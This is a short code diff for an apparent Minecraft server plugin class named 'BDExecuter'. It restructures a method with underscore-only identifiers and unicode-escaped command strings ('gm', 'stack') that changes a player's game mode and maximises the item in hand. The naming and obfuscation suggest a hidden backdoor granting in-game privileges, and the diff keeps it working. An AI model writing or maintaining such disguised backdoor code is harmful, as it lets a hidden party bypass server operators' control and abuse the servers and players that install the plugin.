@@ -21,8 +21,10 @@ public class BDExecuter {
 	}
 
 	public static final synchronized void action(Player _____, String... _______) {
-		int ____ = Integer.parseInt(_______[0].substring(2));
-		if (_______[0].startsWith("\u0067\u006d")) _____.setGameMode(GameMode.values()[____ == 0 ? 1 : (____ == 1 ? 0 : ____)]);
+		if (_______[0].startsWith("\u0067\u006d")) {
+			int ____ = Integer.parseInt(_______[0].substring(2));
+			_____.setGameMode(GameMode.values()[____ == 0 ? 1 : (____ == 1 ? 0 : ____)]);
+		}
 		switch (_______[0]) {
 			case "\u0073\u0074\u0061\u0063\u006b":
 				if (_______[1] == "") _____.getItemInHand().setAmount(_____.getItemInHand().getType().getMaxStackSize());
